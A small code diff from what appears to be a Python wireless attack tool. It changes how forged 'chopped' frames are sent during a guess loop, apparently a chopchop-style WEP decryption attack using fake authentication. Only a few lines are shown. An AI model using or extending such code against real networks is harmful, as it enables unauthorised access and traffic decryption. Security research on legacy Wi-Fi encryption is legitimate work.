@@ -279,7 +279,7 @@ async def main_async(args) -> int:
                 frame = build_chopped_frame(
                     iv, keyid_byte, cipher, guess, bssid_b, fake_auth.source_mac
                 )
-                await iface.send_raw(frame, use_no_ack=True)
+                await iface.send_no_wait(frame)
                 send_ts[guess] = time.time()
                 await asyncio.sleep(args.gap)
             info(f"Sent 256 guesses; listening {args.listen_secs:.0f}s more for "
